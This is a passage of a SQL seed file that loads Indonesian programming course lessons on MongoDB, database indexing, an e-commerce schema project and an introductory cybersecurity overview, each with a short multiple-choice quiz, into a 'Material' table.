**MongoDB** adalah database NoSQL tipe **document store** yang menyimpan data dalam format **BSON** (Binary JSON). Sangat fleksibel karena tidak perlu skema kaku — cocok untuk aplikasi modern dengan data dinamis, prototype cepat, dan skala horizontal. Diciptakan pada 2009 oleh perusahaan 10gen (sekarang MongoDB Inc), MongoDB kini menjadi NoSQL terpopuler dengan adopsi luas di startup hingga enterprise seperti Uber, eBay, dan Adobe.

![Struktur document store MongoDB](https://sfile.chatglm.cn/images-ppt/732bf850a843.jpeg)

## Struktur Data MongoDB

```text
Database
  └─ Collection (≈ tabel di RDBMS)
       └─ Document (≈ row, tapi format JSON)
            └─ Field (≈ column)
```

Perbedaan kunci: document bisa punya struktur berbeda dalam satu collection (schemaless). Tapi best practice tetap maintain konsistensi schema via application layer atau MongoDB schema validation.

## Contoh Document

```javascript
{
  _id: ObjectId("65a1b2c3d4e5f6..."),
  name: "Andi",
  email: "andi@mail.com",
  addresses: [
    { city: "Jakarta", zip: "10110", type: "primary" },
    { city: "Bandung", zip: "40111", type: "secondary" }
  ],
  meta: {
    lastLogin: ISODate("2024-01-15"),
    verified: true,
    loginCount: 42
  },
  tags: ["premium", "early-adopter"]
}
```

Nested document dan array mendalam sangat natural di MongoDB. Hal yang di RDBMS butuh 3 tabel (users, addresses, tags) bisa di MongoDB disimpan dalam 1 document.

## Operasi CRUD (Mongo Shell)

```bash
# Connect ke MongoDB
mongosh "mongodb://localhost:27017/coderoom"

# Insert
db.users.insertOne({ name: "Andi", email: "andi@mail.com" })
db.users.insertMany([{ name: "Budi" }, { name: "Citra" }])

# Find (query)
db.users.find({ name: "Andi" })
db.users.find({ "addresses.city": "Jakarta" }).pretty()
db.users.find({ age: { $gt: 18 } })

# Update
db.users.updateOne(
  { name: "Andi" },
  { $set: { status: "active" }, $inc: { loginCount: 1 } }
)

# Delete
db.users.deleteOne({ _id: ObjectId("...") })
```

## Operator Query Umum

```text
$eq, $ne      → sama dengan / tidak
$gt, $gte     → lebih besar (sama dengan)
$lt, $lte     → lebih kecil (sama dengan)
$in, $nin     → ada di / tidak di array
$and, $or     → logika
$regex        → pattern matching
$exists       → field ada/tidak
$elemMatch    → match element di array
$size         → panjang array
$type         → tipe BSON
```

## Update Operator

```javascript
$set    : set nilai field
$unset  : hapus field
$inc    : increment angka
$push   : tambah ke array
$pull   : hapus dari array
$rename : ganti nama field
$min/$max : update hanya jika lebih kecil/besar
```

Operator `$` adalah positional operator — update element pertama yang match di array. Sangat powerful untuk update nested.

## Index di MongoDB

```javascript
// Buat index untuk query cepat
db.users.createIndex({ email: 1 }, { unique: true })
db.posts.createIndex({ author: 1, createdAt: -1 })

// Text index untuk full-text search
db.posts.createIndex({ title: "text", content: "text" })

// Geospatial index
db.places.createIndex({ location: "2dsphere" })

// Lihat index
db.users.getIndexes()

// Explain query plan
db.users.find({ email: "x@y.com" }).explain("executionStats")
```

MongoDB mendukung banyak tipe index: single, compound, multikey (array), text, geospatial, hashed (untuk sharding). Tanpa index, query melakukan `COLLSCAN` (collection scan) yang lambat di data besar.

## Aggregation Pipeline

```javascript
// Total order per user, hanya yang > 5
db.orders.aggregate([
  { $group: { _id: "$userId", total: { $sum: "$amount" } } },
  { $match: { total: { $gt: 5 } } },
  { $sort: { total: -1 } },
  { $limit: 10 }
])
```

Aggregation pipeline adalah fitur paling powerful MongoDB — mirip SQL JOIN+GROUP BY+HAVING tapi dengan stage berantai. Stage umum: `$match`, `$group`, `$project`, `$sort`, `$limit`, `$lookup` (JOIN), `$unwind` (explode array).

## Replica Set & Sharding

```text
Replica Set → 1 primary + N secondary, auto-failover
              - High availability
              - Read scaling (read dari secondary)
              - Disaster recovery

Sharding    → Data dibagi horizontal ke multiple shard
              - Horizontal scaling (write scaling)
              - Sharding key menentukan distribusi
              - Mongos sebagai query router
```

Sharding cocok untuk dataset >1TB atau write throughput tinggi. Pemilihan shard key krusial — salah pilih = hot shard dan tidak scalable.

## Transaksi Multi-Document

Sejak v4.0, MongoDB mendukung **multi-document ACID transactions**:

```javascript
const session = db.getMongo().startSession()
session.startTransaction()
try {
  db.accounts.updateOne({_id: 1}, {$inc: {balance: -100}}, {session})
  db.accounts.updateOne({_id: 2}, {$inc: {balance: 100}}, {session})
  session.commitTransaction()
} catch (e) {
  session.abortTransaction()
}
```

Walau mendukung ACID, transaksi multi-document lebih lambat dari single-document. Sebaiknya model data agar operasi penting bisa dilakukan dalam 1 document atomic.

## Kapan Pakai MongoDB (vs RDBMS)?

**Pilih MongoDB bila:**
- Skema data berubah cepat / tidak terstruktur
- Butuh skala horizontal (sharding)
- Hierarki dalam (nested document) — komentar, log, katalog produk
- Prototype cepat tanpa migration
- JSON-native API (REST, GraphQL)

**Pilih RDBMS bila:**
- Data sangat relasional & banyak JOIN kompleks
- Butuh transaksi ACID kuat (multi-tabel)
- Skema sudah matang dan jarang berubah
- Reporting/OLAP dengan banyak agregasi

## Tips & Best Practices

1. MongoDB sejak v4.0 mendukung **multi-document ACID transactions**, tapi lebih lambat dari RDBMS untuk kasus tersebut. Model data agar transaksi multi-doc jarang diperlukan.
2. Tetap validasi schema di application layer walau MongoDB schemaless — gunakan `JSON Schema Validation` di collection.
3. Index field yang sering di-query, terutama yang dipakai bersamaan (compound index).
4. Hindari document yang tumbuh tak terbatas (16MB limit) — gunakan referensi untuk data besar.
5. Gunakan `explain()` untuk verifikasi query pakai index, bukan COLLSCAN.

## Kesimpulan

MongoDB adalah database document store yang fleksibel dan scalable. Dengan menguasai struktur document, operator CRUD, aggregation pipeline, index, replica set, dan transaksi multi-document, Anda dapat membangun aplikasi yang tangguh untuk data dinamis. Untuk skema yang sangat relasional atau transaksi berat, RDBMS tetap pilihan lebih baik. Polyglot persistence — menggunakan beberapa DB sesuai kebutuhan — adalah pola modern.



## Studi Kasus: Database E-Commerce

Tabel: Users, Products, Categories, Orders.

## Tips

> Mulai dengan SQL sebelum NoSQL.', '🍃', false, '[{"question":"MongoDB menyimpan data dalam format?","options":["Tabel relasional","Document BSON (mirip JSON)","Key-value pair saja","Graph node"],"answer":1,"explanation":"MongoDB menyimpan data sebagai document BSON (Binary JSON). Tiap document bisa punya struktur berbeda dalam satu collection."},{"question":"Konsep di MongoDB yang setara dengan tabel di RDBMS adalah?","options":["Document","Collection","Field","Database"],"answer":1,"explanation":"Collection di MongoDB setara dengan tabel di RDBMS. Berisi kumpulan document, mirip tabel berisi kumpulan row."},{"question":"Kapan MongoDB LEBIH cocok dipilih dibanding PostgreSQL?","options":["Sistem keuangan dengan banyak transaksi ACID","Data dengan skema dinamis & sering berubah","Aplikasi dengan banyak JOIN kompleks","Sistem inventory dengan integritas ketat"],"answer":1,"explanation":"MongoDB unggul untuk data dengan skema dinamis dan tidak terstruktur. Untuk transaksi keuangan & banyak JOIN, RDBMS masih lebih baik."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('database-indexing-performance', 5, 7, 'Database Indexing & Performance', 'database-indexing-performance', 'Index, query optimization, dan database performance tuning.', '# Database Indexing & Performance


![Database Indexing & Performance](https://sfile.chatglm.cn/images-ppt/6d61d7d2fc1c.jpg)

**Index** adalah struktur data khusus (biasanya **B-Tree** atau **Hash**) yang mempercepat pencarian baris. Tanpa index, database harus **full table scan** — membaca semua baris. Dengan index, pencarian jadi O(log n) bukan O(n). Perbedaannya dramatis: query yang butuh detik bisa jadi milidetik. Tapi index juga punya biaya — memperlambat INSERT/UPDATE/DELETE dan memakan storage. Skill indexing adalah seni yang membedakan developer biasa dari DBA profesional.

![Cara kerja database index B-Tree](https://sfile.chatglm.cn/images-ppt/732bf850a843.jpeg)

## Cara Kerja Index

```text
Tabel users (1 juta baris):
Tanpa index: SELECT * WHERE email=''x@y.com''  → scan 1.000.000 baris
Dengan index email:                          → ≈ 20 langkah (B-Tree)
```

B-Tree (Balanced Tree) adalah struktur pohon seimbang di mana pencarian membutuhkan log₂(n) langkah. Untuk 1 juta baris, itu sekitar 20 langkah — jauh lebih cepat dari scan 1 juta baris.

## Membuat Index

```sql
-- Single column index
CREATE INDEX idx_users_email ON users(email);

-- Composite index (urutan kolom PENTING)
CREATE INDEX idx_posts_author_date ON posts(user_id, created_at);

-- Unique index
CREATE UNIQUE INDEX idx_unique_email ON users(email);

-- Partial index (PostgreSQL) - hemat space
CREATE INDEX idx_active_users ON users(last_login)
WHERE active = true;

-- Expression index
CREATE INDEX idx_lower_email ON users(LOWER(email));

-- Lihat index
\d users    -- di psql
SHOW INDEX FROM users;  -- di MySQL
```

## Tipe Index

```text
B-Tree        → Default, cocok untuk =, <, >, BETWEEN, ORDER BY
Hash          → Hanya = equality (cepat tapi terbatas)
GIN           → Array, JSONB, full-text search (PostgreSQL)
GiST          → Geometric, range (PostgreSQL)
BRIN          → Block range, hemat space untuk data time-series
Bitmap        → Internal, gabungan beberapa index
```

## Composite Index: Urutan Kolom Penting

```sql
-- Index ini berguna untuk:
CREATE INDEX idx ON posts(user_id, created_at);

-- ✓ WHERE user_id = 5
-- ✓ WHERE user_id = 5 AND created_at > ''2024-01-01''
-- ✓ WHERE user_id = 5 ORDER BY created_at
-- ✗ WHERE created_at > ''2024-01-01''   -- TIDAK pakai index (leftmost rule)
```

Aturan leftmost: index composite hanya efektif jika query pakai prefix kolom dari kiri. Susun kolom berdasarkan selectivity (paling unik/filtering dulu).

## Kapan Index Membantu / Tidak?

```text
Bermanfaat:
  ✓ Kolom di WHERE, JOIN, ORDER BY, GROUP BY
  ✓ Kolom dengan kardinalitas tinggi (banyak nilai unik)
  ✓ Foreign key (default tidak di-index di beberapa DB)
  ✓ Tabel besar (>1000 baris)

Tidak bermanfaat / merugikan:
  ✗ Tabel kecil (< 1000 baris) - sequential scan lebih cepat
  ✗ Kolom jarang di-query
  ✗ Tabel yang sering INSERT/UPDATE (index memperlambat write)
  ✗ Kolom boolean (kardinalitas rendah)
  ✗ Kolom dengan fungsi di WHERE (kecuali expression index)
```

## Analisis Query: EXPLAIN

```sql
EXPLAIN ANALYZE
SELECT u.name, COUNT(p.id)
FROM users u
LEFT JOIN posts p ON u.id = p.user_id
WHERE u.created_at > ''2024-01-01''
GROUP BY u.id;
```

Lihat output:

```text
Seq Scan    → full table scan (BURUK bila tabel besar)
Index Scan  → pakai index (BAIK)
Index Only Scan → pakai index saja, tidak baca tabel (TERBAIK)
Hash Join   → join dengan hash table (baik untuk besar)
Nested Loop → cocok untuk sedikit baris
Hash Aggregate → agregasi dengan hash
Sort        → bisa dihilangkan dengan index yang tepat
```

`ANALYZE` menjalankan query dan menampilkan waktu nyata. `EXPLAIN` saja hanya menampilkan plan tanpa eksekusi.

## Tips Optimasi Query

1. **SELECT spesifik**, hindari `SELECT *` — bawa lebih sedikit kolom
2. **Index kolom yang di-WHERE & JOIN** — terutama FK
3. **Batasi hasil** dengan LIMIT
4. **Pagination pakai keyset** (`WHERE id > last_id`) lebih cepat dari OFFSET untuk halaman besar
5. **Hindari function di kolom** — `WHERE YEAR(date) = 2024` skip index; pakai range
6. **Materialized view** untuk query agregat berat yang sering dijalankan
7. **Partition tabel besar** berdasarkan range (mis. per bulan)

```sql
-- BURUK: function di kolom mengabaikan index
WHERE DATE(created_at) = ''2024-01-15''

-- BAIK: range tetap pakai index
WHERE created_at >= ''2024-01-15''
  AND created_at <  ''2024-01-16''
```

## Connection Pooling

Setiap koneksi DB memakan memory (5-10MB di PostgreSQL). Tanpa pooling, aplikasi akan cepat habis koneksi:

```text
Tanpa pool: 1000 request → 1000 koneksi → DB overload
Dengan pool: 1000 request → 20 koneksi pool → DB stabil
```

Tool populer:
- **PgBouncer** (PostgreSQL) — connection pooler eksternal
- **HikariCP** (Java) — library di aplikasi
- **pgxpool** (Go) — built-in driver
- **Prisma** — pooling otomatis

## Monitoring & Tuning

```sql
-- PostgreSQL: query paling lambat
SELECT query, mean_exec_time, calls
FROM pg_stat_statements
ORDER BY mean_exec_time DESC
LIMIT 10;

-- Index yang tidak terpakai
SELECT * FROM pg_stat_user_indexes
WHERE idx_scan = 0;

-- Tabel yang butuh VACUUM
SELECT relname, last_vacuum, last_autovacuum
FROM pg_stat_user_tables;
```

## Tips & Best Practices

1. Setiap index tambahan memperlambat INSERT/UPDATE. Jangan over-index — audit dengan `pg_stat_user_indexes` (PostgreSQL) dan hapus yang tidak terpakai.
2. Aktifkan `log_min_duration_statement = 100` di PostgreSQL untuk log query yang lambat dari 100ms — ini cara termudah menemukan query yang perlu dioptimasi.
3. Lakukan `ANALYZE` setelah import data besar agar statistik planner akurat.
4. Monitor `pg_stat_activity` untuk koneksi yang stuck long-query.
5. Untuk data time-series besar, pertimbangkan TimescaleDB atau partition native.

## Kesimpulan

Indexing dan query optimization adalah skill esensial untuk aplikasi yang skalabel. Dengan memahami B-Tree, composite index (leftmost rule), EXPLAIN ANALYZE, dan anti-pattern (function di kolom), Anda dapat membuat query 100x lebih cepat. Selalu ukur sebelum dan sesudah optimasi — "premature optimization is the root of all evil" tapi begitu ada bottleneck, index biasanya solusi pertama.



## Studi Kasus: Database E-Commerce

Tabel: Users, Products, Categories, Orders.

## Tips

> Mulai dengan SQL sebelum NoSQL.', '⚡', false, '[{"question":"Tanpa index, database melakukan pencarian dengan cara?","options":["B-Tree lookup","Hash lookup","Full table scan — baca semua baris","Binary search"],"answer":2,"explanation":"Tanpa index, database harus memindai seluruh baris (full table scan) — O(n) kompleksitas. Index mempercepat ke O(log n)."},{"question":"Perintah untuk melihat query plan di PostgreSQL adalah?","options":["SHOW PLAN","DESCRIBE","EXPLAIN ANALYZE","PLAN QUERY"],"answer":2,"explanation":"EXPLAIN menunjukkan rencana eksekusi query. EXPLAIN ANALYZE juga menjalankan query dan menampilkan waktu nyata tiap langkah."},{"question":"Manakah yang BURUK untuk performa query ber-index?","options":["SELECT id, name FROM users WHERE id = 5","WHERE created_at >= ''2024-01-15'' AND created_at < ''2024-01-16''","WHERE DATE(created_at) = ''2024-01-15''","SELECT name FROM users ORDER BY email LIMIT 10"],"answer":2,"explanation":"Function pada kolom (DATE(created_at)) menyebabkan index tidak bisa dipakai. Gunakan range comparison agar index tetap efektif."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('project-desain-database', 5, 8, 'Project: Desain Database', 'project-desain-database', 'Merancang dan membangun database lengkap untuk aplikasi nyata.', '# Project: Desain Database Aplikasi E-Commerce


![Project: Desain Database](https://sfile.chatglm.cn/images-ppt/9b305d115eeb.png)

Dalam project ini Anda akan merancang database lengkap untuk aplikasi **e-commerce sederhana** mulai dari ER diagram, skema SQL, sampai query analitik. Project ini menggabungkan semua konsep Level 5: relational database, SQL query, JOIN, normalisasi, indexing, dan modeling. Hasil akhir berupa skema production-ready yang bisa dijadikan portofolio. Kerjakan bertahap dan dokumentasikan setiap keputusan desain.

![Skema database aplikasi e-commerce](https://sfile.chatglm.cn/images-ppt/732bf850a843.jpeg)

## 1. Spesifikasi Aplikasi

Aplikasi e-commerce dengan fitur:

- **User** dapat register, login, dan memiliki satu **profile** (1:1)
- **Seller** dapat menjual banyak **products** (1:N)
- **Customer** dapat membuat **orders** berisi banyak product (M:N lewat order_items)
- Setiap order punya **order_items** (qty, harga saat order)
- Product punya **categories** (M:N — satu product bisa banyak kategori)
- Setiap order menghasilkan **payment** dan **shipment** (1:1)
- **Reviews** — customer bisa review product yang sudah dibeli

Pertanyaan desain:
- Apakah harga disimpan di order_items? (snapshot — ya)
- Bagaimana handle stok? (atomic decrement di transaction)
- Soft delete atau hard delete? (soft untuk audit)
- Currency? (single atau multi-currency)

## 2. Buat ER Diagram

```text
users 1--1 profiles
users 1--M orders
users 1--M products (sebagai seller)
orders 1--M order_items
products 1--M order_items
products M--N categories   (lewat product_categories)
orders 1--1 payments
orders 1--1 shipments
products 1--M reviews
users 1--M reviews
```

Gunakan **dbdiagram.io** atau **drawSQL** untuk visualisasi sebelum coding. Tool ini juga bisa generate SQL dari diagram langsung.

## 3. Implementasi Skema SQL

```sql
CREATE TABLE users (
  id          SERIAL PRIMARY KEY,
  email       VARCHAR(255) UNIQUE NOT NULL,
  password    TEXT NOT NULL,
  role        VARCHAR(20) DEFAULT ''customer'',
  created_at  TIMESTAMP DEFAULT NOW(),
  updated_at  TIMESTAMP DEFAULT NOW(),
  deleted_at  TIMESTAMP
);

CREATE TABLE categories (
  id    SERIAL PRIMARY KEY,
  name  VARCHAR(100) UNIQUE NOT NULL,
  slug  VARCHAR(100) UNIQUE NOT NULL
);

CREATE TABLE products (
  id          SERIAL PRIMARY KEY,
  seller_id   INTEGER REFERENCES users(id),
  name        VARCHAR(200) NOT NULL,
  description TEXT,
  price       DECIMAL(12,2) NOT NULL,
  stock       INTEGER DEFAULT 0,
  is_active   BOOLEAN DEFAULT true,
  created_at  TIMESTAMP DEFAULT NOW()
);

CREATE TABLE orders (
  id           SERIAL PRIMARY KEY,
  customer_id  INTEGER REFERENCES users(id),
  status       VARCHAR(20) DEFAULT ''pending'',
  total        DECIMAL(12,2) DEFAULT 0,
  created_at   TIMESTAMP DEFAULT NOW()
);

CREATE TABLE order_items (
  id         SERIAL PRIMARY KEY,
  order_id   INTEGER REFERENCES orders(id) ON DELETE CASCADE,
  product_id INTEGER REFERENCES products(id),
  qty        INTEGER NOT NULL,
  price      DECIMAL(12,2) NOT NULL  -- snapshot harga saat order
);

CREATE TABLE product_categories (
  product_id  INTEGER REFERENCES products(id) ON DELETE CASCADE,
  category_id INTEGER REFERENCES categories(id) ON DELETE CASCADE,
  PRIMARY KEY (product_id, category_id)
);

-- Index untuk performa
CREATE INDEX idx_products_seller ON products(seller_id);
CREATE INDEX idx_orders_customer ON orders(customer_id);
CREATE INDEX idx_order_items_order ON order_items(order_id);
CREATE INDEX idx_products_active ON products(is_active, price);
```

## 4. Seed Data Dummy

```sql
-- Insert users (3 seller + 2 customer)
INSERT INTO users (email, password, role) VALUES
  (''seller1@mail.com'', ''$2a$10$hash1'', ''seller''),
  (''seller2@mail.com'', ''$2a$10$hash2'', ''seller''),
  (''cust1@mail.com'', ''$2a$10$hash3'', ''customer''),
  (''cust2@mail.com'', ''$2a$10$hash4'', ''customer'');

-- Insert categories
INSERT INTO categories (name, slug) VALUES
  (''Elektronik'', ''elektronik''),
  (''Fashion'', ''fashion''),
  (''Makanan'', ''makanan'');

-- Insert products (10 items)
INSERT INTO products (seller_id, name, price, stock) VALUES
  (1, ''Laptop ASUS'', 12000000, 5),
  (1, ''Mouse Logitech'', 250000, 50),
  (2, ''Kaos Premium'', 95000, 100),
  (2, ''Celana Jeans'', 250000, 30);

-- Insert orders (20 orders)
INSERT INTO orders (customer_id, status, total)
SELECT
  3 + (random() * 1)::int,
  CASE (random() * 3)::int WHEN 0 THEN ''pending'' WHEN 1 THEN ''paid'' ELSE ''shipped'' END,
  (random() * 1000000)::numeric(12,2)
FROM generate_series(1, 20);
```

## 5. Tugas Query Analitik

Buat query SQL untuk menjawab:

```sql
-- a) Top 5 produk terlaris bulan ini
SELECT p.name, SUM(oi.qty) AS total_sold
FROM order_items oi
JOIN orders o ON oi.order_id = o.id
JOIN products p ON oi.product_id = p.id
WHERE o.created_at >= date_trunc(''month'', NOW())
GROUP BY p.id, p.name
ORDER BY total_sold DESC
LIMIT 5;

-- b) Total revenue per seller
SELECT u.email, SUM(oi.price * oi.qty) AS revenue
FROM users u
JOIN products p ON p.seller_id = u.id
JOIN order_items oi ON oi.product_id = p.id
GROUP BY u.id, u.email
ORDER BY revenue DESC;

-- c) Customer yang belum pernah order
SELECT u.email
FROM users u
LEFT JOIN orders o ON o.customer_id = u.id
WHERE o.id IS NULL AND u.role = ''customer'';

-- d) Best-selling category
SELECT c.name, SUM(oi.qty * oi.price) AS revenue
FROM categories c
JOIN product_categories pc ON pc.category_id = c.id
JOIN products p ON p.id = pc.product_id
JOIN order_items oi ON oi.product_id = p.id
GROUP BY c.id, c.name
ORDER BY revenue DESC
LIMIT 1;

-- e) Cohort retention: customer yang order di bulan ke-2 setelah order pertama
WITH first_order AS (
  SELECT customer_id, DATE_TRUNC(''month'', MIN(created_at)) AS first_month
  FROM orders GROUP BY customer_id
),
month2_orders AS (
  SELECT DISTINCT o.customer_id
  FROM orders o
  JOIN first_order f ON f.customer_id = o.customer_id
  WHERE DATE_TRUNC(''month'', o.created_at) = f.first_month + INTERVAL ''1 month''
)
SELECT COUNT(DISTINCT f.customer_id) AS retained,
       (SELECT COUNT(*) FROM first_order) AS total
FROM first_order f
JOIN month2_orders m ON m.customer_id = f.customer_id;
```

## 6. Trigger & View (Bonus)

```sql
-- Trigger untuk update orders.total otomatis
CREATE OR REPLACE FUNCTION update_order_total()
RETURNS TRIGGER AS $$
BEGIN
  UPDATE orders
  SET total = (
    SELECT SUM(qty * price) FROM order_items WHERE order_id = NEW.order_id
  )
  WHERE id = NEW.order_id;
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER trg_update_total
AFTER INSERT OR UPDATE OR DELETE ON order_items
FOR EACH ROW EXECUTE FUNCTION update_order_total();

-- View untuk dashboard seller
CREATE VIEW seller_dashboard AS
SELECT
  u.email AS seller,
  COUNT(DISTINCT p.id) AS total_products,
  COUNT(DISTINCT o.id) AS total_orders,
  SUM(oi.qty * oi.price) AS revenue_30d
FROM users u
JOIN products p ON p.seller_id = u.id
JOIN order_items oi ON oi.product_id = p.id
JOIN orders o ON o.id = oi.order_id
WHERE o.created_at >= NOW() - INTERVAL ''30 days''
GROUP BY u.id, u.email;
```

## 7. Deliverables

1. File `schema.sql` berisi CREATE TABLE lengkap dengan constraint & index
2. File `seed.sql` dengan data dummy (≥ 5 user, 10 produk, 20 order)
3. File `analytics.sql` berisi 5 query analitik
4. ER diagram (PNG/PDF dari dbdiagram.io)
5. Dokumentasi singkat pilihan design (kenapa pakai snapshot harga di order_items?)
6. File `bonus.sql` berisi trigger & view (opsional)

## 8. Bonus Challenge

- Tambahkan **soft delete** (kolom `deleted_at`) di semua tabel
- Implementasi **trigger** untuk update `orders.total` otomatis saat order_items di-insert
- Buat **view** untuk dashboard seller (revenue harian 30 hari terakhir)
- Migrasikan ke **MongoDB** untuk perbandingan — dokumen product dengan kategori nested
- Implementasi **full-text search** untuk produk dengan PostgreSQL `tsvector`
- Tambahkan **row-level security** agar seller hanya lihat produk sendiri

## Tips & Best Practices

1. Kerjakan secara bertahap — skema dulu, lalu seed, baru query analitik. Jangan langsung ke bonus sebelum 5 deliverable utama selesai.
2. Test skema dengan data edge case: qty=0, price negatif, order tanpa item, dsb.
3. Verifikasi query dengan `EXPLAIN ANALYZE` — pastikan pakai index.
4. Dokumentasikan setiap keputusan desain (mis. "snapshot price karena harga bisa berubah, order harus tetap akurat").
5. Presentasikan hasil ke teman/recruiter. Penjelasan kenapa Anda memilih desain tertentu (mis. snapshot price) lebih bernilai daripada SQL-nya sendiri.

## Kesimpulan

Project ini mengintegrasikan semua konsep Level 5: desain skema, normalisasi, indexing, SQL query, JOIN, agregasi, trigger, dan view. Dengan menyelesaikan e-commerce database end-to-end, Anda memiliki portofolio konkret yang menunjukkan kemampuan database engineering. Hasilnya bisa dijadikan bahan diskusi interview dan dasar untuk aplikasi nyata.



## Studi Kasus: Database E-Commerce

Tabel: Users, Products, Categories, Orders.

## Tips

> Mulai dengan SQL sebelum NoSQL.', '🛠️', true, '[{"question":"Mengapa kolom `price` disimpan juga di tabel order_items (snapshot)?","options":["Supaya tabel lebih besar","Agar harga historis order tidak berubah saat product.price di-update","Karena tidak bisa JOIN ke products","Untuk mempercepat query INSERT"],"answer":1,"explanation":"Harga product bisa berubah, tapi order yang sudah dibuat harus merekam harga saat transaksi. Maka order_items menyimpan snapshot price."},{"question":"Untuk relasi M:N antara products dan categories, kita butuh?","options":["Kolom array di tabel products","Junction table product_categories dengan FK ke keduanya","Foreign key di tabel products","Trigger khusus"],"answer":1,"explanation":"Many-to-Many butuh junction table (product_categories) berisi product_id dan category_id sebagai foreign key, dengan PK gabungan."},{"question":"Query yang benar untuk menemukan customer yang belum pernah order adalah?","options":["SELECT email FROM users WHERE id NOT IN orders","SELECT email FROM users WHERE orders = 0","SELECT u.email FROM users u LEFT JOIN orders o ON o.customer_id = u.id WHERE o.id IS NULL","SELECT email FROM users WHERE customer_id IS NULL"],"answer":2,"explanation":"LEFT JOIN + IS NULL adalah pola klasik untuk ''baris di A yang tidak punya match di B''. Alternatif modern: NOT EXISTS."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('pengenalan-cybersecurity', 6, 1, 'Pengenalan Cybersecurity', 'pengenalan-cybersecurity', 'Mengenal cybersecurity, mengapa penting, dan peran security professional.', '# Pengenalan Cybersecurity


![Pengenalan Cybersecurity](https://sfile.chatglm.cn/images-ppt/b960626436f4.jpg)

**Cybersecurity** adalah praktik melindungi sistem komputer, jaringan, perangkat, dan data dari serangan digital yang berusaha mengakses, mengubah, atau menghancurkan informasi sensitif tanpa izin. Di era transformasi digital, hampir seluruh aspek kehidupan—mulai dari perbankan, kesehatan, pemerintahan, hingga rumah tangga—bergantung pada infrastruktur teknologi informasi. Oleh karena itu, keamanan siber bukan lagi tanggung jawab satu tim teknis saja, melainkan kepentingan seluruh organisasi dan setiap individu pengguna teknologi.

![Pengenalan Cybersecurity](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Mengapa Cybersecurity Sangat Penting

Setiap organisasi menyimpan data berharga: identitas pelanggan, transaksi keuangan, kekayaan intelektual, hingga rahasia dagang. Satu insiden kebocoran data dapat memicu kerugian finansial besar, merusak reputasi bertahun-tahun, hingga menarik sanksi hukum. Ransomware seperti WannaCry dan NotPetya pada 2017 menghentikan operasional rumah sakit, pelabuhan, dan pabrik global. Saat ini biaya rata-rata satu kebocoran data mencapai jutaan dolar, sehingga investasi pada keamanan jauh lebih murah dibanding biaya pemulihan pasca-insiden.

## Tujuan Utama Cybersecurity

1. **Mencegah (Prevent)** — membatasi permukaan serangan melalui hardening, patching, dan kontrol akses.
2. **Mendeteksi (Detect)** — mengenali anomali dan indikator kompromi sedini mungkin melalui monitoring.
3. **Menanggapi (Respond)** — melakukan kontainment, eradikasi, dan investigasi saat insiden terjadi.
4. **Memulihkan (Recover)** — mengembalikan layanan dan data ke kondisi normal serta menerapkan pelajaran.

Siklus ini dikenal sebagai **NIST Cybersecurity Framework** (Identify–Protect–Detect–Respond–Recover), standar de facto yang diadopsi organisasi global.

## Lanskap Ancaman Modern

Ancaman siber terus berkembang seiring teknologi. Beberapa kategori utama meliputi:

- **Malware** — virus, worm, trojan, ransomware, spyware.
- **Phishing & Social Engineering** — memanipulasi manusia untuk membocorkan kredensial.
- **Web Application Attacks** — SQL Injection, XSS, CSRF, hingga API abuse.
- **Supply Chain Attacks** — menyerang vendor atau pustaka pihak ketiga (contoh: SolarWinds).
- **DDoS** — membanjiri layanan hingga tidak tersedia.
- **Zero-Day Exploit** — menyerang kerentanan yang belum diketahui vendor.

## Peran Security Professional

```text
- Security Analyst     : monitoring harian & analisis log di SOC
- Penetration Tester   : menyerang sistem secara legal untuk menemukan celah
- Security Engineer    : membangun & mengkonfigurasi pertahanan teknis
- Incident Responder   : menangani krisis saat serangan terjadi
- Forensic Analyst     : investigasi pasca-insiden & pengumpulan bukti
- Security Architect   : merancang arsitektur keamanan menyeluruh
- GRC Specialist       : kepatuhan, kebijakan, dan manajemen risiko
```

## Audit Keamanan Cepat

```bash
# Cek port terbuka di host
sudo netstat -tulpn | grep LISTEN

# Cek update keamanan tertunda (Debian/Ubuntu)
sudo apt list --upgradable 2>/dev/null | grep -i secur

# Cek user dengan privilege sudo
getent group sudo

# Cek kebijakan password
sudo chage -l $USER
```

## Tips & Best Practices

- Terapkan **principle of least privilege** pada setiap akun dan layanan.
- Aktifkan **MFA** untuk semua akses administratif.
- Lakukan **patch management** otomatis dan terjadwal.
- Backup data dengan strategi **3-2-1** (3 salinan, 2 media, 1 offsite).
- Latih karyawan dengan simulasi phishing berkala.

## Kesimpulan

Cybersecurity adalah proses berkelanjutan, bukan produk sekali beli. Pertahanan terbaik menggabungkan teknologi, prosedur, dan kesadaran manusia. Dengan memahami ancaman, peran setiap profesi keamanan, dan siklus NIST, Anda telah meletakkan fondasi yang kuat untuk eksplorasi materi keamanan siber selanjutnya.



## Studi Kasus: Security Audit

Reconnaissance, Scanning, Testing, Exploitation, Reporting.

## Tips

> Hanya uji sistem yang Anda miliki atau punya izin tertulis.', '🛡️', false, '[{"question":"Apa tujuan utama cybersecurity?","options":["Mempercepat koneksi internet","Melindungi sistem, jaringan, dan data","Menjual perangkat lunak","Mengganti hardware lama"],"answer":1,"explanation":"Cybersecurity melindungi sistem, jaringan, dan data dari serangan digital."},{"question":"Peran yang menyerang sistem secara legal untuk menemukan celah?","options":["SOC Engineer","Penetration Tester","Forensic Analyst","Network Admin"],"answer":1,"explanation":"Penetration Tester melakukan simulasi serangan dengan izin untuk menemukan kerentanan."},{"question":"Perintah untuk melihat port yang sedang mendengarkan?","options":["sudo netstat -tulpn | grep LISTEN","ping localhost","curl -I https://site","ssh user@host"],"answer":0,"explanation":"netstat -tulpn menampilkan port TCP/UDP yang sedang dalam status LISTEN."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('cia-triad-prinsip-keamanan', 6, 2, 'CIA Triad & Prinsip Keamanan', 'cia-triad-prinsip-keamanan', 'Confidentiality, Integrity, Availability - tiga pilar keamanan informasi.', '# CIA Triad & Prinsip Keamanan


